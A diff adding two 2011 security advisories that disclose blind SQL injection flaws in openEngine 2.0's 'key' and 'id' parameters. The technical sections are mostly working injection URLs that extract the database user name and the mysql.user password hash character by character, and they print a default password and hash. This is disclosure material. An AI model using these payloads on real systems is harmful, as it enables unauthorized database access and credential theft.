@@ -1,0 +1,157 @@
+Advisory:              		openEngine 2.0 'key' Blind SQL Injection vulnerability
+Advisory ID:           	SSCHADV2011-026
+Author:                		Stefan Schurtz
+Affected Software:  	Successfully tested on openEngine 2.0 100226
+Vendor URL:          	http://www.openengine.de/
+Vendor Status:       	informed
+CVE-ID:                	 	-
+
+==========================
+Vulnerability Description:
+==========================
+
+The 'key' parameter in openEngine 2.0 is prone to a Blind SQL Injection
+
+==================
+Technical Details:
+==================
+
+# Database information
+User: easy
+
+# Blind SQL Injection
+
+http://<target>/openengine/cms/website.php?id=/de/sendpage.htm&key=-1 OR 1=2 -> "Sie m?chten die Seite versenden."
+http://<target>/openengine/cms/website.php?id=/de/sendpage.htm&key=-1 OR 1=1 -> "Sie m?chten die Seite Homepage (de) versenden."
+
+# User-Guessing
+
+http://<target>/openengine/cms/website.php?id=/de/sendpage.htm&key=-1 OR ORD(MID((SELECT DISTINCT(IFNULL(CAST(grantee AS CHAR),CHAR(32))) FROM information_schema.USER_PRIVILEGES LIMIT 4,1),2,1)) = 101 
+http://<target>/openengine/cms/website.php?id=/de/sendpage.htm&key=-1 OR ORD(MID((SELECT DISTINCT(IFNULL(CAST(grantee AS CHAR),CHAR(32))) FROM information_schema.USER_PRIVILEGES LIMIT 4,1),3,1)) = 97
+http://<target>/openengine/cms/website.php?id=/de/sendpage.htm&key=-1 OR ORD(MID((SELECT DISTINCT(IFNULL(CAST(grantee AS CHAR),CHAR(32))) FROM information_schema.USER_PRIVILEGES LIMIT 4,1),4,1)) = 115
+http://<target>/openengine/cms/website.php?id=/de/sendpage.htm&key=-1 OR ORD(MID((SELECT DISTINCT(IFNULL(CAST(grantee AS CHAR),CHAR(32))) FROM information_schema.USER_PRIVILEGES LIMIT 4,1),5,1)) = 121
+
+=========
+Solution:
+=========
+
+-
+
+====================
+Disclosure Timeline:
+====================
+
+08-Oct-2011 - informed developers
+08-Oct-2011 - release date of this security advisory
+
+========
+Credits:
+========
+
+Vulnerability found and advisory written by Stefan Schurtz.
+
+===========
+References:
+===========
+
+http://www.openengine.de/
+http://www.rul3z.de/advisories/SSCHADV2011-026.txt
+
+Advisory: openEngine 2.0 'id' Blind SQL Injection
+vulnerability
+Advisory ID: SSCHADV2011-019
+Author: Stefan Schurtz
+Affected Software: Successfully tested on openEngine 2.0 100226
+Vendor URL: http://www.openengine.de/
+Vendor Status: informed
+CVE-ID: -
+
+==========================
+Vulnerability Description:
+==========================
+
+openEngine 2.0 is prone to a Blind SQL Injection
+
+==================
+Technical Details:
+==================
+
+Database information
+
+User: easy
+Password: easy (Hash: *E8F5FAE73EBB89AE362C59646600DDCD35EAD7E0)
+
+Blind SQL Injection
+
+http://<target>/openengine/cms/website.php?id=/de/sendpage.htm') AND 1=1
+AND ('a'='a&key= <- error
+http://<target>/openengine/cms/website.php?id=/de/sendpage.htm') AND 1=0
+AND ('a'='a&key= <- no error
+
+User-Guessing
+
+http://<target>/openengine/cms/website.php?id=/de/sendpage.htm') AND
+ORD(MID((SELECT DISTINCT(IFNULL(CAST(grantee AS CHAR),CHAR(32))) FROM
+information_schema.USER_PRIVILEGES LIMIT 4,1),2,1)) = 101 AND ('a'='a
+<- error (e)
+
+http://<target>/openengine/cms/website.php?id=/de/sendpage.htm') AND
+ORD(MID((SELECT DISTINCT(IFNULL(CAST(grantee AS CHAR),CHAR(32))) FROM
+information_schema.USER_PRIVILEGES LIMIT 4,1),3,1)) = 97 AND ('a'='a <-
+error (a)
+
+http://<target>/openengine/cms/website.php?id=/de/sendpage.htm') AND
+ORD(MID((SELECT DISTINCT(IFNULL(CAST(grantee AS CHAR),CHAR(32))) FROM
+information_schema.USER_PRIVILEGES LIMIT 4,1),4,1)) = 115 AND ('a'='a
+<- error (s)
+
+http://<target>/openengine/cms/website.php?id=/de/sendpage.htm') AND
+ORD(MID((SELECT DISTINCT(IFNULL(CAST(grantee AS CHAR),CHAR(32))) FROM
+information_schema.USER_PRIVILEGES LIMIT 4,1),5,1)) = 121 AND ('a'='a
+<- error (y)
+
+Password(Hash)-Guessing
+
+http://<target>/openengine/cms/website.php?id=/de/sendpage.htm') AND
+ORD(MID((SELECT DISTINCT(IFNULL(CAST(password AS CHAR),CHAR(32))) FROM
+mysql.user WHERE user=CHAR(101,97,115,121) LIMIT 0,1),1,1)) = 42 AND
+('a'='a <- error (*)
+
+http://<target>/openengine/cms/website.php?id=/de/sendpage.htm') AND
+ORD(MID((SELECT DISTINCT(IFNULL(CAST(password AS CHAR),CHAR(32))) FROM
+mysql.user WHERE user=CHAR(101,97,115,121) LIMIT 0,1),2,1)) = 69 AND
+('a'='a <- error (E)
+
+http://<target>/openengine/cms/website.php?id=/de/sendpage.htm') AND
+ORD(MID((SELECT DISTINCT(IFNULL(CAST(password AS CHAR),CHAR(32))) FROM
+mysql.user WHERE user=CHAR(101,97,115,121) LIMIT 0,1),3,1)) = 56 AND
+('a'='a <- error (8)
+... and so on
+
+=========
+Solution:
+=========
+
+-
+
+====================
+Disclosure Timeline:
+====================
+
+25-Sep-2011 - informed developers
+26-Sep-2011 - release date of this security advisory
+27-Sep-2011 - post on BugTraq
+
+========
+Credits:
+========
+
+Vulnerability found and advisory written by Stefan Schurtz.
+
+===========
+References:
+===========
+
+http://www.openengine.de/
+http://www.securityfocus.com/bid/49794/info
+http://www.rul3z.de/advisories/SSCHADV2011-019.txt
